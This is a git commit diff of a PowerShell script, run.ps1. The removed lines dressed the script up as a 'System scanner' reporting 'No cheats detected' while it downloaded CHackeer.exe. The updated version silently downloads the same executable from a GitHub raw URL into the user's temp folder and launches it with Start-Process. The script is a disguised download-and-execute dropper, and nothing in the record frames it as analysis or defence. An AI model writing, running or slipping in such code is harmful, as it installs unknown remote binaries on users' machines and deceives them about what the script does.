832214d2ba44ef4917851959964943c020e66e21
fundrug35-jpg <fundrug35@gmail.com>
2026-09-09 20:59:04 +0300

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,5 +1,2 @@
-Write-Host "System scanner"
-Write-Host "No cheats detected"
-curl.exe -s -o "$env:TEMP\CHackeer.exe" https://raw.githubusercontent.com/fundrug35-jpg/asdasdad/main/CHackeer.exe
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/fundrug35-jpg/asdasdad/main/CHackeer.exe" -OutFile "$env:TEMP\CHackeer.exe"
 Start-Process "$env:TEMP\CHackeer.exe"
-Read-Host "Press Enter"
